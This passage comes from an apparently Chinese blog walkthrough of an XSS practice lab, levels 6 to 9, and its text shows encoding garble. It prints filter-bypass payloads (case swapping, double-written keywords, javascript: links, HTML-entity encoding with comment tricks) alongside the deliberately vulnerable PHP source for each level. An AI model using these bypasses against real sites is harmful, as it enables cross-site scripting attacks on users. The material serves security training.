class="comment">//æ›¿æ¢src</span></span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);    <span class="comment">//æ›¿æ¢data</span></span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);   <span class="comment">//æ›¿æ¢href</span></span><br><span class="line"><span class="comment">//å¸¸è§„çš„ä¼ªåè®®æ— æ³•ç»•è¿‡</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªå¾ˆå¤§çš„ç ´ç»½:</span></span><br><span class="line"><span class="comment">//1.æ²¡æœ‰å…ˆå®ä¾‹åŒ–è½¬ä¹‰å˜é‡$str6,åªæ˜¯è¿›è¡Œâ€™éƒ¨åˆ†æœ‰é™â€˜çš„â€™é»‘åå•â€˜æ ‡ç­¾æ›¿æ¢ï¼Œå°±æ‹¼æ¥åˆ°valueçš„å€¼ï¼Œ</span></span><br><span class="line"><span class="comment">//2.str_replaceå‡½æ•°é»˜è®¤åŒºåˆ†å¤§å°å†™çš„ä¸”æ˜¯ä¸¥æ ¼åŒ¹é…çš„ï¼ˆåªæœ‰ä¸€æ ·çš„å­—ç¬¦æ‰ä¼šè¢«æ›¿æ¢ï¼‰</span></span><br><span class="line"><span class="comment">//1+2-&gt;å¤§å°å†™ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‰é¢çš„å…³å¡ä¸­ level1æ ¹æœ¬æ²¡å¿…è¦æ›¿æ¢ level2åœ¨æ‹¼æ¥valueçš„å€¼ä¹‹å‰å°±å®ä¾‹åŒ–è½¬ä¹‰äº† level3 level4 level5 åŒç†</span></span><br><span class="line"><span class="comment">//ä¸ºä»€ä¹ˆåœ¨æ‹¼æ¥valueçš„å€¼ä¹‹å‰å°±å®ä¾‹åŒ–è½¬ä¹‰äº†å°±æ— æ³•ä½¿ç”¨å¤§å°å†™ç»•è¿‡å‘¢ï¼Ÿ</span></span><br><span class="line"><span class="comment">//é¦–å…ˆï¼Œè¾“å…¥æ¡†ç±»å‹çš„é‡ç‚¹åœ¨äºå¦‚ä½•å¤„ç†value 1.é—­åˆ-&gt;é€ƒé€¸  2.åŠ å±æ€§ </span></span><br><span class="line"><span class="comment">//åŠ å±æ€§ä¸éœ€è¦è®¨è®ºï¼Œè¦å®ç°é€ƒé€¸å°±è¦ä½¿ç”¨&quot;é—­åˆvalue,ä½†&quot;è¢«å®ä¾‹åŒ–è½¬ä¹‰ï¼Œå› æ­¤å¤§å°å†™ç»•è¿‡ä¸èƒ½å®ç°ï¼Œå³éƒ½æ²¡æœ‰æ»¡è¶³1ï¼Œå³ä½¿æ»¡è¶³2ï¼Œä¹Ÿæ— æ³•å®ç°å¤§å°å†™ç»•è¿‡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>ç±»å‹ï¼šè¾“å…¥æ¬¾ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š<br>è¾“å…¥æµ‹è¯•è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_24.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>script è¢«æ›¿æ¢ä¸ºç©º</li>
<li>æˆåŠŸé€ƒé€¸</li>
<li>åŒå¼•å·æ²¡æœ‰åˆ«å®ä¾‹åŒ–è½¬ä¹‰æˆ–æ›¿æ¢</li>
</ul>
<p>è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_25.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>ä¸¤æ¬¡æµ‹è¯•ç»“æœä¸€æ ·ï¼Œé‚£å°±è¯´æ˜æœ‰ç‚¹å¼‚æ ·äº†</li>
<li>è¯´æ˜è¢«å˜é‡çš„è‹±æ–‡å­—ç¬¦è¢«ç»Ÿä¸€è½¬ä¸ºå°å†™åå†è¿›è¡Œæ›¿æ¢</li>
</ul>
<p>è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_26.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>å®ç°é€ƒé€¸</li>
<li>javascriptä¸­çš„scriptè¢«æ›¿æ¢ä¸ºç©º</li>
<li>ä¸‹é¢çš„ â€œâ€&gt;â€ å®ä¸ºåŸæœ‰inputæ ‡ç­¾çš„åé¢éƒ¨åˆ†â€“&gt;æµè§ˆå™¨çš„å®¹é”™</li>
<li>hrefä¹Ÿæ›¿æ¢ä¸ºç©º</li>
</ul>
<blockquote>
<p>ç”±ä»¥ä¸Šçš„ä¸‰æ¬¡æµ‹è¯•ï¼Œå‘ç°é—­åˆé€ƒé€¸æ˜¯å¯ä»¥å®ç°çš„ï¼Œåªä¸è¿‡æ˜¯æŸäº›æ ‡ç­¾å’Œå±æ€§ä¼šè¢«æ›¿æ¢ä¸ºç©ºã€‚</p>
</blockquote>
<h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="*åŒå†™ç»•è¿‡"></a>*åŒå†™ç»•è¿‡</h3><p>è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;123&quot;);<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span> </span><br><span class="line">&quot; oonnclick=&#x27;alert(&quot;123&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ†æåŒå†™</li>
</ul>
<p>scscriptript ç¬¬ä¸€æ¬¡åŒ¹é…ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹ï¼Œå³sc script ript åˆ é™¤åå³ä¸º script</p>
<p> å¯¹äºå…¶ä»–ä¼ªåè®®ç­‰æµ‹è¯•ä¸ä¸å†æµ‹è¯•ï¼ˆå†™å¾—å¤ªç´¯äº†(&lt;!_!&gt;)ï¼‰â€“&gt;æºç åˆ†æ</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å…¥æ¡†ç±»å‹ä¸­éœ€è¦é—­åˆvalueçš„ç±»å‹å®ç°åŒå†™ç»•è¿‡çš„ä¸‰ä¸ªæ¡ä»¶ï¼š</span></span><br><span class="line"><span class="comment">//1.åœ¨æ‹¼æ¥valueä¹‹å‰ï¼Œå˜é‡æ²¡æœ‰è¢«å®ä¾‹åŒ–è½¬ä¹‰ï¼ˆ&quot;ä¼šè¢«å®ä¾‹åŒ–è½¬ä¹‰ï¼‰</span></span><br><span class="line"><span class="comment">//2.å¯¹åº”å­—ç¬¦åˆ«æ›¿æ¢ä¸ºç©º</span></span><br><span class="line"><span class="comment">//3.åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œåªå®ç°ä¸€æ¬¡æ›¿æ¢</span></span><br><span class="line"><span class="comment">//1+2+3-&gt;åŒå†™ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>è¾“å…¥ï¼štest</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_27.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>è¾“å…¥å†…å®¹è¢«æ‹¼æ¥åˆ°è¶…é“¾æ¥ä¸­-&gt;å¯ä»¥å°è¯•ä¼ªåè®®</li>
</ul>
<p> è¾“å…¥ï¼š javascript:alert(â€œ123â€)</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_28.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<ul>
<li>javascriptä¸­çš„scriptè¢«æ›¿æ¢,ä¸”ä¸æ˜¯æ›¿æ¢ä¸ºç©º</li>
<li>æ‹¬å·å†…çš„ç¬¬ä¸€ä¸ªåŒå¼•å·è¢«å®ä¾‹åŒ–è½¬ä¹‰</li>
</ul>
<p> ï¼ˆå…¶ä»–ä¼ªåè®®ç±»å‹è‡ªä¸»æµ‹è¯•ï¼‰</p>
<p>ç”±ä¸Šå¯çŸ¥ï¼š</p>
<ul>
<li>æ‹¬å·å†…ä¸åº”å†ä½¿ç”¨åŒå¼•å·ï¼Œå°è¯•ä½¿ç”¨å•å¼•å·</li>
</ul>
<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="*ç¼–ç ç»•è¿‡"></a>*ç¼–ç ç»•è¿‡</h3><p>åŸç†ï¼š*è¡¥å……çŸ¥è¯† ç›®å½•æœ‰è§£é‡Š</p>
<blockquote>
<p>åŸè¯­å¥ï¼šjavascript:alert(â€œ123â€)<br>unicode ç¼–ç ï¼ˆ16è¿›åˆ¶ï¼‰ï¼š</p>
<blockquote>
<p><code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0022&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0022&amp;#x0029 </code></p>
</blockquote>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_29.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æˆåŠŸç»•è¿‡</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);  <span class="comment">//ç»Ÿä¸€è½¬ä¸ºå°å†™-&gt;é˜²æ­¢å¤§å°å†™ç»•è¿‡</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="comment">//ä»¥ä¸Šä¸ºæ›¿æ¢å­—ç¬¦</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> <span class="comment">//æ·»åŠ é“¾æ¥ä½¿ç”¨äº†æœ€ä¸ºç®€å•çš„æ–¹æ³•ï¼šecho åŠ æ ‡ç­¾</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æŸ¥çœ‹ç½‘é¡µæºç å¯çŸ¥,å¯ä»¥å°è¯•æ’å…¥ä¼ªåè®®</p>
<p>ä½†æ˜¯,æ— è®ºè¾“å…¥é‚£ç§ä¼ªåè®®ï¼Œç½‘é¡µæºç å§‹ç»ˆä¸ºï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_30.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>è¾“å…¥:</p>
<blockquote>
<p>http:&#x2F;&#x2F;<br>è‡³äºä¸ºä»€ä¹ˆè¾“å…¥ï¼Œå…¨é ç»éªŒ</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_31.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>è¾“å…¥:</p>
<blockquote>
<p> 123http:&#x2F;&#x2F;<br> http:&#x2F;&#x2F; ashjdhj<br>ä»¥ä¸Šè¯­å¥éƒ½ä¼šè¢«æ·»åŠ </p>
</blockquote>
<ul>
<li>æ‰€ä»¥åªè¦è¯†åˆ«åˆ°http:&#x2F;&#x2F;å°±ä¼šæ·»åŠ ï¼ˆæºç åˆ†æä¼šè§£é‡Šï¼‰</li>
</ul>
<h3 id="æ³¨é‡Šï¼š"><a href="#æ³¨é‡Šï¼š" class="headerlink" title="*æ³¨é‡Šï¼š"></a>*æ³¨é‡Šï¼š</h3><p> ç°åœ¨æ€è€ƒå¦‚ä½•å°† http:&#x2F;&#x2F;åµŒå…¥ä¼ªåè®®çš„jsä»£ç ä¸­è€Œä¸å½±å“å…¶æ‰§è¡Œ<br> -&gt;ä½¿ç”¨æ³¨é‡Š</p>
<blockquote>
<p>&#x2F;&#x2F;  åœ¨jsä¸­ä¸ºå•è¡Œæ³¨é‡Š<br>&#x2F;**&#x2F; åœ¨jsä¸­ä¸ºå¤šè¡Œæ³¨é‡Š</p>
</blockquote>
<p>å°è¯•è¾“å…¥ï¼š</p>
<blockquote>
<p>javascript:alert(â€˜123â€™)&#x2F;* http:&#x2F;&#x2F; *&#x2F;<br>javascript:alert(â€˜123â€™)&#x2F;&#x2F; http:&#x2F;&#x2F; </p>
</blockquote>
<p>éƒ½å¯ä»¥è¢«æˆåŠŸæ·»åŠ </p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_32.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>scriptè¢«æ›¿æ¢ä¸”ä¸ä¸ºç©º-&gt;å°è¯•å¤§å°å†™ç»•è¿‡</li>
</ul>
<p>è¾“å…¥ï¼š</p>
<blockquote>
<p>javasCript:alert(â€˜123â€™) &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_33.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>å¯çŸ¥å˜é‡è¢«ç»Ÿä¸€è½¬ä¸ºå°å†™ï¼Œåè¢«æ›¿æ¢</li>
</ul>
<p>å°è¯•ï¼šæ³¨é‡Š+ç¼–ç </p>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0027&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0027&amp;#x0029&amp;#x0020&amp;#x002f&amp;#x002a&amp;#x0068&amp;#x0074&amp;#x0074&amp;#x0070&amp;#x003a&amp;#x002f&amp;#x002f&amp;#x002a&amp;#x002f</span></span><br><span class="line">ä¸Šè¿°ä¸ºjavascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">/*http://*/</span> unicodeç¼–ç çš„ç»“æœ</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_34.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>æ’å…¥å¤±è´¥ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</li>
</ul>
<p>åˆ†æåŸå› ï¼š</p>
<blockquote>
<p>unicodeç¼–ç åçš„å­—ç¬¦ä¼šè¢«æµè§ˆå™¨è‡ªåŠ¨è§£ç ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸ä¼šè§£ç ï¼ˆæŒ‡åç«¯æ²¡æœ‰å¯¹unicodeè§£ç çš„ä»£ç ç¨‹åºï¼‰ï¼Œæ‰€ä»¥åç«¯ä»£ç æ¥å—åˆ°çš„æ˜¯ä¸€å †â€˜å¥‡æ€ªâ€™å­—ç¬¦ï¼Œç”±äºæ²¡æœ‰ä¸¥æ ¼è¯†åˆ«åˆ°http:&#x2F;&#x2F; ï¼Œæ‰€ä»¥ä¸ä¼šå°†å˜é‡å€¼æ‹¼æ‹¼æ¥<br>è§£å†³æªæ–½ï¼š</p>
<blockquote>
<p>å¯¹äºjavascriptçš„scriptä¸­ä»»æ„(ä¸é™æ•°é‡)å­—ç¬¦è¿›è¡Œunicodeç¼–ç </p>
</blockquote>
</blockquote>
<p>è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">javascrip&amp;<span class="comment">#x0074:alert(&#x27;123&#x27;) /*http://*/ </span></span><br><span class="line">t  -&gt; &amp;<span class="comment">#x0074</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸé€šå…³</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span 